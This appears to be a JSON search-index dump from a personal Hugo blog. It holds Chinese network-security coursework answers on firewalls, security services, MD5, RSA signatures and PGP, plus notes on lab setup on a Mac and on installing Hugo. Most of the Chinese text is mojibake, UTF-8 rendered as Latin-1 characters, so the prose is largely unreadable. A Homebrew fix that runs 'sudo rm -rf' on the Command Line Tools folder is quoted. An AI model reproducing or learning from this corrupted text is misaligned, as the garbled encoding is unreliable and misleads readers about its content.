Açš„ipåœ°å€ å°†ipåœ°å€è®¾ç½®ä¸º55.0.0.24 ![[Pasted image 20231024211518.png|400]]\nVPNè¿æ¥ è¿›è¡ŒVPNè¿æ¥ ![[Pasted image 20231024223124.png|400]]\nè¿æ¥åçš„IPå˜åŒ– clientA ![[Pasted image 20231024221917.png|400]]\nVPN Server ![[Pasted image 20231024223749.png|400]]\nwiresharkæŠ“åŒ… ","date":"2023-10-26T15:51:26+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A2/","title":"ç½‘ç»œå®‰å…¨ä½œä¸š2"},{"content":"å¾—åˆ†ï¼š10/10\nç®€è¿°é˜²ç«å¢™çš„å®šä¹‰ é˜²ç«å¢™æ˜¯ä½äºä¸¤ä¸ª(æˆ–å¤šä¸ª)ç½‘ç»œä¹‹é—´æ‰§è¡Œè®¿é—®æ§åˆ¶çš„è½¯ä»¶å’Œç¡¬ä»¶ç³»ç»Ÿï¼Œå®ƒæ ¹æ®è®¿é—®æ§åˆ¶è§„åˆ™å¯¹è¿›å‡ºç½‘ç»œçš„æ•°æ®æµè¿›è¡Œè¿‡æ»¤ã€‚\né˜²ç«å¢™å¯¹æ•°æ®æµçš„æ‹’ç»å’Œä¸¢å¼ƒæœ‰ä½•åŒºåˆ«?\nå½“æ•°æ®æµè¢«æ‹’ç»æ—¶ï¼Œé˜²ç«å¢™è¦å‘å‘é€è€…å›å¤ä¸€æ¡æ¶ˆæ¯ï¼Œç”¨ICMPåŒ…å‘ŠçŸ¥æ•°æ®æºæ•°æ®åŒ…è¢«æ‹’ç»çš„åŸå› ï¼Œæç¤ºå‘é€è€…è¯¥æ•°æ®æµå·²è¢«æ‹’ç»ã€‚ å½“æ•°æ®æµè¢«ä¸¢å¼ƒæ—¶ï¼Œé˜²ç«å¢™ä¸ä¼šå¯¹è¿™äº›æ•°æ®åŒ…è¿›è¡Œä»»ä½•å¤„ç†ï¼Œä¹Ÿä¸ä¼šå‘å‘é€è€…å‘é€ä»»ä½•æç¤ºä¿¡æ¯ã€‚ä¸¢å¼ƒæ•°æ®åŒ…çš„åšæ³•åŠ é•¿äº†ç½‘ç»œæ‰«ææ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå‘é€è€…åªèƒ½ç­‰å¾…å›åº”ç›´è‡³é€šä¿¡è¶…æ—¶ã€‚ ç®€è¿°æ•°æ®åŒ…è¿‡æ»¤å™¨å’ŒçŠ¶æ€é˜²ç«å¢™ã€‚\næ•°æ®åŒ…è¿‡æ»¤å™¨é€šè¿‡æ•°æ®åŒ…çš„å¤´éƒ¨ä¿¡æ¯æ¥åˆ¤æ–­æ˜¯æ¥å—è¿˜æ˜¯æ‹’ç»æ•°æ®åŒ…ï¼Œå®ƒå¹¶ä¸æŸ¥çœ‹æ•°æ®åŒ…è½½è·ä¸­çš„åº”ç”¨æ•°æ®ã€‚è¿™ç§é˜²ç«å¢™æ£€æŸ¥æµç»å®ƒçš„æ¯ä¸ªæ•°æ®åŒ…ï¼Œæ ¹æ®æ•°æ®åŒ…æœ¬èº«æ‰€å¸¦çš„ä¿¡æ¯å†³å®šå®ƒçš„å»ç•™ï¼Œè€Œä¸ç”¨å‚è€ƒå…¶ä»–æ•°æ®åŒ…çš„å†…å®¹ã€‚ çŠ¶æ€é˜²ç«å¢™ä¼šé€šè¿‡å¯¹æµç»çš„æ•°æ®åŒ…çš„åˆ†ææŸ¥æ‰¾é€šä¿¡ä¸­çš„æ•°æ®æµï¼Œæ ¹æ®æ•°æ®æµçš„ä¿¡æ¯æ¥å¸®åŠ©åˆ¤æ–­æ˜¯å¦è®©æ•°æ®åŒ…é€šè¡Œã€‚æ•°æ®æµæä¾›äº†æ•°æ®åŒ…çš„ä¸Šä¸‹æ–‡ã€‚çŠ¶æ€é˜²ç«å¢™æœ‰æ—¶è¿˜ä¼šæ£€æµ‹ä¸€äº›å¸¸ç”¨åè®®çš„åº”ç”¨æ•°æ®ï¼ˆè™½ç„¶å¯ä»¥æ£€æµ‹çš„æ•°æ®é‡æ˜¯æœ‰é™çš„ï¼‰ï¼Œé€šè¿‡è¿™äº›æ•°æ®æ¥è¯†åˆ«å’Œè·Ÿè¸ªç›¸å…³çš„æ•°æ®æµã€‚ ä¸åŒ…è¿‡æ»¤é˜²ç«å¢™ç›¸æ¯”ï¼Œåº”ç”¨ä»£ç†é˜²ç«å¢™æœ‰å“ªäº›ç‰¹ç‚¹ï¼Ÿ\nåœ¨å·²æœ‰çš„å®‰å…¨æ¨¡å‹ä¸­å®‰å…¨æ€§è¾ƒé«˜ã€‚ å…·æœ‰å¼ºå¤§çš„è®¤è¯åŠŸèƒ½ã€‚ å…·æœ‰è¶…å¼ºçš„æ—¥å¿—åŠŸèƒ½ã€‚ åº”ç”¨çº§ç½‘å…³é˜²ç«å¢™çš„è§„åˆ™é…ç½®æ¯”è¾ƒç®€å• åœ¨é˜²ç«å¢™çš„å…¸å‹éƒ¨ç½²ä¸­ï¼Œå ¡å’ä¸»æœºæ˜¯ä¸€ä¸ªç»„ç»‡æœºæ„ç½‘ç»œå®‰å…¨çš„ä¸­å¿ƒä¸»æœºï¼Œå®ƒåº”è¯¥å…·å¤‡å“ªäº›ä¸»è¦ç‰¹å¾ï¼Ÿ\nå ¡å’ä¸»æœºç¡¬ä»¶å¹³å°è¿è¡Œè¾ƒä¸ºå®‰å…¨çš„æ“ä½œç³»ç»Ÿï¼Œæˆä¸ºå¯ä¿¡ä»»çš„ç³»ç»Ÿã€‚ åªæœ‰ç½‘ç»œç®¡ç†å‘˜è®¤ä¸ºå¿…è¦çš„æœåŠ¡(ä»£ç†å’Œç”¨æˆ·è®¤è¯ç­‰)æ‰ä¼šå®‰è£…åœ¨å ¡å’ä¸»æœºä¸Šã€‚ å½“å…è®¸ä¸€ä¸ªç”¨æˆ·è®¿é—®ä»£ç†æœåŠ¡æ—¶ï¼Œå ¡å’ä¸»æœºå¯èƒ½ä¼šè¦æ±‚è¿›è¡Œé¢å¤–è®¤è¯ã€‚å¦å¤–ï¼Œæ¯ä¸€ä¸ªä»£ç†æœåŠ¡éƒ½å¯èƒ½éœ€è¦ç›¸åº”çš„é‰´åˆ«æœºåˆ¶(Authentication) æ¯ä¸€ä¸ªä»£ç†éƒ½åªèƒ½æ”¯æŒæ ‡å‡†åº”ç”¨æœåŠ¡å‘½ä»¤é›†ä¸­çš„ä¸€ä¸ªå­é›†ã€‚ æ¯ä¸€ä¸ªä»£ç†åªå…è®¸è®¿é—®æŒ‡å®šä¸»æœºçš„é€šä¿¡ï¼Œæ”¯æŒå¯¹é€šä¿¡è¿›è¡Œè¯¦ç»†çš„å®¡è®¡ã€‚ æ¯ä¸€ä¸ªä»£ç†æ¨¡å—éƒ½æ˜¯ä¸€ä¸ªä¸ºç½‘ç»œå®‰å…¨è®¾è®¡çš„ä¸€ä¸ªå¾ˆå°çš„è½¯ä»¶åŒ…ã€‚ ä»£ç†ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚ ä»£ç†é€šå¸¸æ— éœ€è¿›è¡Œç£ç›˜è®¿é—®ï¼Œä¸éœ€è¦è¯»å–åˆå§‹é…ç½®æ–‡ä»¶ã€‚è¿™ä½¿å¾—å…¥ä¾µè€…å¾ˆéš¾åœ¨ä¸»æœºä¸Šå®‰è£…Trojan horseã€sniffersæˆ–å…¶ä»–å±é™©çš„æ–‡ä»¶ã€‚ å ¡å’ä¸»æœºæ˜¯ä¸€ä¸ªç»„ç»‡æœºæ„ç½‘ç»œå®‰å…¨çš„ä¸­å¿ƒä¸»æœºã€‚ ","date":"2023-10-26T10:17:18+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/","title":"ç½‘ç»œå®‰å…¨ä½œä¸š3"},{"content":"å¾—åˆ†ï¼š9/10\nç¬¬ä¸€ç«  1. å¦‚æœä½ çš„ç½‘ç»œæœåŠ¡å™¨è¢«é»‘å®¢è¿œç¨‹æ§åˆ¶ï¼Œåˆ—ä¸¾3ä¸ªå¯èƒ½è¢«ç ´åçš„å®‰å…¨å±æ€§ï¼Œ å¹¶è§£é‡Šç†ç”±ã€‚ æœºå¯†æ€§ï¼š ç†ç”±ï¼šè¿œç¨‹æ§åˆ¶æœåŠ¡å™¨åï¼Œé»‘å®¢å¯ä»¥åœ¨æœªè¢«æˆæƒçš„æƒ…å†µä¸‹è·å–ä¸ªäººä¿¡æ¯ã€æ•°æ®åº“è®°å½•ç­‰æ•°æ®ï¼Œå¯¼è‡´æ•°æ®æ³„éœ²å’Œéšç§ä¾µçŠ¯ã€‚ å®Œæ•´æ€§ï¼š ç†ç”±ï¼šé»‘å®¢è¿œç¨‹æœåŠ¡å™¨åï¼Œå¯ä»¥ç¯¡æ”¹æœåŠ¡å™¨ä¸Šçš„æ•°æ®æˆ–è€…ç¨‹åºæ–‡ä»¶ï¼Œä¿®æ”¹ç½‘ç«™å†…å®¹ã€æ›´æ”¹é…ç½®æ–‡ä»¶ã€æ’å…¥æ¶æ„ä»£ç ç­‰ã€‚ å¯ç”¨æ€§ï¼š ç†ç”±ï¼šé»‘å®¢å¯èƒ½é€šè¿‡è¿œç¨‹æ§åˆ¶æœåŠ¡å™¨å‘åŠ¨æ‹’ç»æœåŠ¡æ”»å‡»æˆ–ç›´æ¥ç¦ç”¨æœåŠ¡å™¨ä¸Šçš„å…³é”®æœåŠ¡å’ŒåŠŸèƒ½ï¼Œå¯¼è‡´æœåŠ¡å™¨æ— æ³•æ­£å¸¸è¿è¡Œã€‚ ä¸å¯æŠµèµ–æ€§ï¼š ç†ç”±ï¼šé»‘å®¢å¯ä»¥ä½¿ç”¨æœåŠ¡å™¨çš„è®¿é—®æƒé™æ‰§è¡Œæ¶æ„æ“ä½œå¦‚æ•°æ®ç¯¡æ”¹ã€‚å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¶³å¤Ÿçš„å®‰å…¨æªæ–½æ¥è®°å½•è¿™äº›æ“ä½œå¹¶ç¡®ä¿å…¶ä¸å¯æŠµèµ–æ€§ï¼Œé‚£ä¹ˆé»‘å®¢å¯èƒ½ä¼šå¦è®¤æ›¾ç»æ‰§è¡Œè¿‡è¿™äº›æ“ä½œï¼Œå¯¼è‡´éš¾ä»¥è¿½è¸ªå’Œè¯æ˜è´£ä»»ã€‚\n2. ç®€è¿°RFC2828å®‰å…¨æœåŠ¡çš„å®šä¹‰ï¼Œä¾‹ä¸¾Windows10ç³»ç»Ÿçš„3ç§å®‰å…¨æœåŠ¡ã€‚\nRFC2828å®šä¹‰äº†å®‰å…¨æœåŠ¡ä¸ºä¸€ç§ç”±ç³»ç»Ÿæä¾›çš„å¯¹ç³»ç»Ÿèµ„æºè¿›è¡Œç‰¹æ®Šä¿æŠ¤çš„å¤„ç†æˆ–é€šä¿¡æœåŠ¡ï¼Œå®‰å…¨æœåŠ¡é€šè¿‡å®‰å…¨æœºåˆ¶æ¥å®ç°å®‰å…¨ç­–ç•¥ã€‚ITU-Tï¼ˆå³X.800ï¼‰å®šä¹‰äº†äº”ç§æœåŠ¡ï¼šèº«ä»½è®¤è¯ã€è®¿é—®æ§åˆ¶ã€æ•°æ®ä¿å¯†ã€æ•°æ®å®Œæ•´æ€§ã€ä¸å¯å¦è®¤ã€‚ Windows 10æ“ä½œç³»ç»Ÿä¸­çš„ä¸‰ç§å®‰å…¨æœåŠ¡ï¼š\nè®¤è¯æœåŠ¡ï¼šè®¤è¯æœåŠ¡ç”¨äºéªŒè¯ç”¨æˆ·çš„èº«ä»½ï¼Œç¡®ä¿åªæœ‰ç»è¿‡æˆæƒçš„ç”¨æˆ·èƒ½å¤Ÿè®¿é—®ç³»ç»Ÿæˆ–èµ„æºã€‚åœ¨Windows 10ä¸­ï¼Œç”¨æˆ·å¿…é¡»æä¾›æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç æ‰èƒ½ç™»å½•åˆ°ç³»ç»Ÿã€‚ è®¿é—®æ§åˆ¶æœåŠ¡ï¼šè®¿é—®æ§åˆ¶æœåŠ¡ç”¨äºç¡®å®šå“ªäº›ç”¨æˆ·æˆ–å®ä½“å…·æœ‰æƒé™è®¿é—®ç‰¹å®šèµ„æºæˆ–æ‰§è¡Œç‰¹å®šæ“ä½œï¼Œå¹¶ç¡®ä¿æœªç»æˆæƒçš„è®¿é—®è¢«æ‹’ç»ã€‚åœ¨Windows 10ä¸­ï¼Œè®¿é—®æ§åˆ¶æœåŠ¡ç®¡ç†æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„æƒé™ï¼Œä»¥åŠç³»ç»Ÿèµ„æºçš„è®¿é—®æƒé™ã€‚ åŠ å¯†æœåŠ¡ï¼šåŠ å¯†æœåŠ¡ç”¨äºå°†æ•æ„Ÿæ•°æ®è½¬åŒ–ä¸ºä¸å¯è¯»çš„æ ¼å¼ï¼Œä»¥ç¡®ä¿å³ä½¿æ•°æ®è¢«æœªç»æˆæƒçš„è®¿é—®è€…è·å–ï¼Œä¹Ÿæ— æ³•ç†è§£å…¶å†…å®¹ã€‚åªæœ‰å…·æœ‰æ­£ç¡®å¯†é’¥çš„ç”¨æˆ·æ‰èƒ½è§£å¯†æ•°æ®ã€‚BitLockeræ˜¯ä¸€ä¸ªWindows 10ä¸­çš„å·¥å…·ï¼Œå®ƒå¯ä»¥åŠ å¯†æ•´ä¸ªç¡¬ç›˜æˆ–è€…æŸäº›éƒ¨åˆ†ï¼Œä»¥ä¿æŠ¤æ•°æ®å…å—ä¸¢å¤±æˆ–ç›—å–çš„å¨èƒã€‚ 3 . ç®€è¿°ç½‘ç»œå®‰å…¨é˜²æŠ¤ä¸»è¦ç›®æ ‡çš„â€œäº”ä¸â€ã€‚ 1. ä¸æ³„éœ²ï¼ˆNon-Disclosureï¼‰ï¼šç¡®ä¿ç½‘ç»œä¸­çš„æ•æ„Ÿä¿¡æ¯å’Œæ•°æ®ä¸ä¼šæ³„éœ²ç»™æœªç»æˆæƒçš„ç”¨æˆ·æˆ–ç³»ç»Ÿã€‚ 2. ä¸ç ´åï¼ˆNon-Destructionï¼‰ï¼šé˜²æ­¢ç½‘ç»œç³»ç»Ÿå’Œæ•°æ®è¢«ç ´åã€æŸåæˆ–ç¯¡æ”¹ã€‚ 3. ä¸æ‹’ç»ï¼ˆNon-Repudiationï¼‰ï¼šç¡®ä¿åœ¨ç½‘ç»œäº¤äº’ä¸­çš„å„ç§æ“ä½œå’Œäº¤æ˜“éƒ½å¯ä»¥è¢«è¯æ˜ï¼Œä¸å®¹æ˜“è¢«å¦è®¤ã€‚ 4. ä¸ä¸­æ–­ï¼ˆNon-Interruptionï¼‰ï¼šç¡®ä¿ç½‘ç»œæœåŠ¡çš„æŒç»­å¯ç”¨æ€§ï¼Œé˜²æ­¢ç”±äºæ”»å‡»ã€æ•…éšœæˆ–å…¶ä»–åŸå› å¯¼è‡´çš„ç½‘ç»œæœåŠ¡ä¸­æ–­ã€‚ 5. ä¸è¿Ÿæ»ï¼ˆNon-Delayï¼‰ï¼šä¿éšœç½‘ç»œé€šä¿¡çš„å®æ—¶æ€§ï¼Œé˜²æ­¢å› ç½‘ç»œæ‹¥å¡ã€å»¶è¿Ÿæˆ–å…¶ä»–é—®é¢˜å¯¼è‡´é€šä¿¡å»¶è¿Ÿã€‚\nç¬¬ä¸‰ç«  1. åœ¨è…¾è®¯ä¼šè®®ç³»ç»Ÿä¸­ï¼Œå¯¹ç§°å¯†ç æŠ€æœ¯å’Œå…¬é’¥å¯†ç æŠ€æœ¯é€‚åˆåº”ç”¨åœ¨å“ªå‡ ä¸ªé˜¶æ®µ?è¯´æ˜ç†ç”±ã€‚\nä¼šè¯åŠ å¯†é˜¶æ®µï¼šå¯¹ç§°å¯†ç æŠ€æœ¯éå¸¸é€‚åˆåœ¨ä¼šè¯åŠ å¯†é˜¶æ®µä½¿ç”¨ã€‚ä¸€æ—¦å‚ä¸ä¼šè®®çš„ç”¨æˆ·å»ºç«‹äº†å®‰å…¨è¿æ¥ï¼Œå¯ä»¥ä½¿ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•æ¥åŠ å¯†å’Œè§£å¯†æ•°æ®é€šä¿¡ã€‚è¿™æ˜¯å› ä¸ºå¯¹ç§°å¯†ç æŠ€æœ¯å…·æœ‰è¾ƒé«˜çš„åŠ å¯†å’Œè§£å¯†é€Ÿåº¦ï¼Œä½¿å…¶éå¸¸é€‚åˆå¯¹å¤§é‡çš„éŸ³è§†é¢‘æ•°æ®è¿›è¡Œå¿«é€Ÿçš„åŠ å¯†å’Œè§£å¯†æ“ä½œã€‚\nç™»å½•æ—¶èº«ä»½éªŒè¯å’Œå¯†é’¥äº¤æ¢é˜¶æ®µï¼šå…¬é’¥å¯†ç æŠ€æœ¯é€šå¸¸ç”¨äºå®‰å…¨åœ°è¿›è¡Œèº«ä»½éªŒè¯å’Œå¯†é’¥äº¤æ¢ã€‚åœ¨è…¾è®¯ä¼šè®®ç³»ç»Ÿä¸­ï¼Œå½“ç”¨æˆ·é¦–æ¬¡ç™»å½•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å…¬é’¥å¯†ç æŠ€æœ¯æ¥éªŒè¯å…¶èº«ä»½ï¼Œå¹¶åå•†ç”¨äºå¯¹ç§°åŠ å¯†çš„ä¼šè¯å¯†é’¥ã€‚\n2. ç®€è¿°æ•£åˆ—å‡½æ•°MD5çš„ç¢°æ’é—®é¢˜ã€‚æ—¢ç„¶MD5å­˜åœ¨ç¢°æ’é—®é¢˜ï¼Œä¸ºä½•http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/ ä»ç„¶ç»™å‡ºMD5å€¼ä½œä¸ºå®Œæ•´æ€§éªŒè¯çš„ä¾æ®ã€‚ MD5çš„ç¢°æ’é—®é¢˜æ˜¯æŒ‡ä¸¤ä¸ªä¸åŒçš„è¾“å…¥æ•°æ®åœ¨ç»è¿‡MD5ç®—æ³•å¤„ç†åï¼Œå¾—åˆ°äº†ç›¸åŒçš„æ•£åˆ—å€¼ã€‚è¿™ç§æƒ…å†µè¢«ç§°ä¸ºç¢°æ’ã€‚ è‡³äºä¸ºä»€ä¹ˆä»ç„¶ç»™å‡ºMD5å€¼ä½œä¸ºå®Œæ•´æ€§éªŒè¯çš„ä¾æ®ï¼Œå¯èƒ½æ˜¯å› ä¸ºMD5æ˜¯ä¸€ä¸ªç›¸å¯¹å¿«é€Ÿçš„æ•£åˆ—å‡½æ•°ï¼Œé€‚ç”¨äºå¿«é€ŸéªŒè¯å¤§é‡æ–‡ä»¶çš„å®Œæ•´æ€§ã€‚å‘è¡Œç›˜ä¹‹åçš„ç³»ç»Ÿå®‰è£…å’Œè½¯ä»¶å®‰è£…ä¹Ÿæœ‰é¢å¤–çš„å®‰å…¨éªŒè¯ç¨‹åºã€‚\n3. ç®€è¿°ç”¨RSAå…¬é’¥ç®—æ³•å®ç°æ•°å­—ç­¾åçš„è¿‡ç¨‹ã€‚ï¼ˆè¿™ä¸ªé—®é¢˜å›ç­”çš„ä¸å¥½ï¼‰ æ•°å­—ç­¾åè¿‡ç¨‹å¦‚ä¸‹ï¼š 1. å‘é€è€…ä½¿ç”¨è‡ªå·±çš„ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆæ•°å­—ç­¾åã€‚ 2. å‘é€è€…å°†æ¶ˆæ¯å’Œæ•°å­—ç­¾åä¸€èµ·å‘é€ç»™æ¥æ”¶è€…ã€‚ 3. æ¥æ”¶è€…ä½¿ç”¨å‘é€è€…çš„å…¬é’¥å¯¹æ•°å­—ç­¾åè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°æ¶ˆæ¯çš„æ‘˜è¦ã€‚ 4. æ¥æ”¶è€…ä½¿ç”¨ç›¸åŒçš„æ‘˜è¦ç®—æ³•å¯¹æ¶ˆæ¯è¿›è¡Œæ‘˜è¦å¤„ç†ï¼Œå¾—åˆ°æ‘˜è¦ã€‚ 5. æ¥æ”¶è€…æ¯”è¾ƒä¸¤ä¸ªæ‘˜è¦æ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸åŒï¼Œåˆ™è¯´æ˜æ¶ˆæ¯æ²¡æœ‰è¢«ç¯¡æ”¹è¿‡ã€‚\n4. ç”¨PGPåŠ å¯†æŸä¸ªæ–‡ä»¶ï¼Œå¦‚æœæ¥æ”¶è¯¥åŠ å¯†æ–‡ä»¶çš„ç”¨æˆ·ä¸º1ä¸ªï¼ŒåŠ å¯†æ–‡ä»¶çš„å¤§å°ä¸º24kBï¼›å¦‚æœæ¥æ”¶è¯¥åŠ å¯†æ–‡ä»¶çš„ç”¨æˆ· ä¸º10ä¸ªï¼Œè¯·é—®åŠ å¯†æ–‡ä»¶çš„å¤§å°æ˜¯åŸæ¥çš„10å€(240kB)å—ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ ç­”ï¼šåŠ å¯†æ–‡ä»¶çš„å¤§å°ä¸ä¼šæ˜¯åŸæ¥çš„10å€ï¼Œç”±äºå¯¹ç§°å¯†é’¥æ˜¯ç›¸å¯¹è¾ƒçŸ­çš„ï¼Œæ¯ä¸ªæ¥æ”¶è€…çš„éå¯¹ç§°å¯†é’¥é€šå¸¸å¾ˆå°ã€‚å› æ­¤ï¼Œæ— è®ºæ¥æ”¶è€…æ•°é‡æ˜¯1ä¸ªè¿˜æ˜¯10ä¸ªï¼Œå¯¹ç§°å¯†é’¥å¯†æ–‡çš„æ€»å¤§å°éƒ½ä¸ä¼šæ˜¾è‘—å¢åŠ ï¼Œè€Œæ–‡ä»¶å†…å®¹åŠ å¯†åªéœ€ä¸€æ¬¡ï¼Œå› æ­¤æ–‡ä»¶å¤§å°ä»ç„¶æ˜¯åŸå§‹æ–‡ä»¶å¤§å°ï¼ˆ24kBï¼‰åŠ ä¸Šå¯¹ç§°å¯†é’¥å¯†æ–‡çš„å¤§å°çš„æ€»å’Œï¼Œè€Œä¸ä¼šå˜æˆåŸæ¥çš„10å€ã€‚\n","date":"2023-10-26T10:17:13+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A1/","title":"ç½‘ç»œå®‰å…¨ä½œä¸š1"},{"content":"ç½‘ç»œå®‰å…¨å®éªŒé…ç½® ç”±äºMacçš„mç³»åˆ—èŠ¯ç‰‡ä½¿ç”¨äº†armæ¶æ„ä¸windows serveré•œåƒè¦æ±‚çš„x86æ¶æ„ä¸åŒï¼Œè€å¸ˆä½¿ç”¨çš„virtual boxå’Œmacæœ€å¸¸ç”¨çš„pdæ¨¡æ‹Ÿå™¨å‡åªèƒ½è¿›è¡ŒåŒæ¶æ„ç³»ç»Ÿçš„æ¨¡æ‹Ÿã€‚äºæ˜¯ä¹æˆ‘åˆæŸ¥é˜…äº†èµ„æ–™ï¼Œå‘ç°UTMå¯ä»¥åœ¨macä¸Šè¿›è¡Œä¸åŒæ¶æ„çš„æ¨¡æ‹Ÿï¼ˆè™½ç„¶å¾ˆå¡ä¹Ÿå¾ˆéš¾ç”¨ï¼Œç»ˆå½’æ˜¯è·‘é€šäº†ï¼‰ï¼Œä»¥ä¸‹æ˜¯æˆ‘çš„é…ç½®è¿‡ç¨‹:\nUTMä¸‹è½½å’Œå®‰è£… ç›´æ¥å®˜ç½‘UTM | Virtual machines for Macä¸‹è½½å¹¶å®‰è£…å°±å¥½ã€‚\nwindows serveré•œåƒä¸‹è½½ è¿™æ—¶å€™åˆå‡ºå²”å­äº†ï¼Œè€å¸ˆæä¾›çš„windows 2003ä¸çŸ¥é“æ˜¯ä¸æ˜¯å¤ªè€äº†ï¼ŒUTMæ¨¡æ‹Ÿä¸äº†ã€‚åªèƒ½æƒ³åŠæ³•æ¢æ›´æ–°çš„windows sever2012 ä¸‹è½½é•œåƒåœ°å€ï¼šHelloWindows.cn - ç²¾æ ¡ å®Œæ•´ æè‡´ Windowsç³»ç»Ÿä¸‹è½½ä»“å‚¨ç«™ æ³¨ï¼šéœ€ä¸‹è½½è¿…é›·è¿›è¡Œç£åŠ›é“¾ä¸‹è½½\nwiresharkçš„å®‰è£… ç›´æ¥å®˜ç½‘Wireshark Â· Go Deepä¸‹è½½å®‰è£…å°±å¥½\nUTMå’Œæœ¬åœ°æ–‡ä»¶çš„å…±äº« å¾…è¡¥å……\nç»ˆäºæ˜¯èƒ½åœ¨macä¸Šè·‘å®éªŒäº†ï¼Œç±»ç›®ã€‚\nUTMä¸‹å¤åˆ¶çš„ä¸»æœºäº’pingé—®é¢˜ æœ¬æ¥åƒæŒ‰ç…§è€å¸ˆæ‰€ç»™çš„å†…å®¹é…ç½®äº†ä¸ƒä¸ªhost-onlyç½‘ç»œï¼Œç½‘ç»œæ˜¯å¯ä»¥æ­å»ºèµ·æ¥çš„ï¼Œä½†æ˜¯serverå’Œclientä¸¤ä¸ªè™šæ‹Ÿæœºä¹‹é—´æ— æ³•äº’pingã€‚ æŸ¥é˜…äº†å¾ˆå¤šèµ„æ–™ä¹‹åå‘ç°å¾—è®¾ç½®æˆæ¡¥æ¥æ¨¡å¼ï¼Œå¹¶æŠŠæ¥å£è®¾ç½®æˆen0å³å¯ã€‚å¦‚å›¾ï¼š ","date":"2023-10-26T10:15:50+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E9%85%8D%E7%BD%AE/","title":"ç½‘ç»œå®‰å…¨å®éªŒé…ç½®"},{"content":"å‚è€ƒï¼šå¿«é€Ÿå…¥é—¨ | Hugo ä¸­æ–‡ç½‘\nç¯å¢ƒå‡†å¤‡ å®‰è£…hugo brew install hugo\né—®é¢˜1\n1 2 3 Cloning into \u0026#39;/Users/agq/Library/Caches/Homebrew/hugo--git\u0026#39;... fatal: unable to access \u0026#39;https://github.com/gohugoio/hugo.git/\u0026#39;: Recv failure: Operation timed out è§£å†³æ–¹æ³•ï¼šå…³é—­ä»£ç†\né—®é¢˜2\n1 2 3 Cloning into \u0026#39;/Users/agq/Library/Caches/Homebrew/hugo--git\u0026#39;... fatal: unable to access \u0026#39;https://github.com/gohugoio/hugo.git/\u0026#39;: Failed to connect to github.com port 443 after 75008 ms: Couldn\u0026#39;t connect to server é…ç½®ä»£ç†\n1 2 3 4 5 git config --global http.proxyÂ 127.0.0.1:7890 git config --global https.proxyÂ 127.0.0.1:7890 git config --global http.proxy socks5 127.0.0.1:7890 git config --global https.proxy socks5 127.0.0.1:7890 é—®é¢˜3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 Error: Your Command Line Tools (CLT) does not support macOS 14. It is either outdated or was modified. Please update your Command Line Tools (CLT) or delete it if no updates are available. Update them from Software Update in System Settings. If that doesn\u0026#39;t show you any updates, run: sudo rm -rf /Library/Developer/CommandLineTools sudo xcode-select --install Alternatively, manually download them from: https://developer.apple.com/download/all/. You should download the Command Line Tools for Xcode 14.3. è§£å†³æ–¹æ³•ï¼šæ ¹æ®æç¤ºè¿è¡Œå‘½ä»¤å³å¯\n1 2 3 4 5 sudo rm -rf /Library/Developer/CommandLineTools sudo xcode-select --install brew update-reset å®‰è£…git brew install git\næœ¬åœ°é™æ€åšå®¢æ­å»º åˆ›å»ºæ–°ç«™ç‚¹ `hugo new site quickstart\né…ç½®ä¸»é¢˜\n1 2 3 cd quickstart git init git submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/ananke ç„¶åï¼Œå°†ä¸»é¢˜æ·»åŠ åˆ°ç«™ç‚¹çš„é…ç½®æ–‡ä»¶ä¸­ï¼š\n1 echo \u0026#39;theme = \u0026#34;ananke\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.toml ç„¶åå¯åŠ¨ï¼Œåœ¨ http://localhost:1313/ è¿›è¡Œæœ¬åœ°æŸ¥çœ‹\n1 hugo server -D è¿™é‡Œå®¹æ˜“å‡ºç°ä¸€ä¸ªé”™è¯¯ï¼Œå°±æ˜¯hugo.tomlçš„themeæ²¡æœ‰è®¾ç½®ï¼Œå¯¼è‡´å‡ºç°PageNotFoundã€‚\nä»¥ä¸Šæ˜¯hugoçš„åŸºæœ¬å®‰è£…æ•™ç¨‹ã€‚\né…ç½®æœ¬åœ°é™æ€é¡µé¢ æ‰¾æ¥æ‰¾å»ï¼Œæœ¬æ¥æƒ³ç”¨academyæ¥åšå­¦æœ¯ä¸»é¡µï¼Œç»“æœåˆè¦å®åè®¤è¯ï¼Œç•¥æœ‰äº›éº»çƒ¦ï¼Œäºæ˜¯æ¢ä¸Šäº†stackã€‚\nå…·ä½“å¯ä»¥çœ‹GitHub - CaiJimmy/hugo-theme-stack: Card-style Hugo theme designed for bloggers\nç»†èŠ‚å°±ä¸èµ˜è¿°äº†ï¼Œç»ˆäºæ˜¯é…ç½®å¥½äº†ï¼Œæœ€åæ˜¯ç›®å‰çš„æˆå“ã€‚ AGA\u0026rsquo;s Blog\nå…¶ä»–åŠŸèƒ½ å›¾åºŠé…ç½® æ‰“å¼€å›¾åºŠé…ç½® | PicXåœ¨çº¿ä½¿ç”¨ é…ç½®å‚è€ƒå¿«é€Ÿå¼€å§‹ | PicX å›¾åºŠä½¿ç”¨æŒ‡å—\nobsidianå¯¼å‡º markdown 1 obsidian-export /Users/agq/Documents/obsidian/æºæ–‡ä»¶/ /Users/agq/Documents/obsidian/ç›®çš„æ–‡ä»¶å¤¹/ è¯„è®ºé…ç½® å‚è€ƒSite 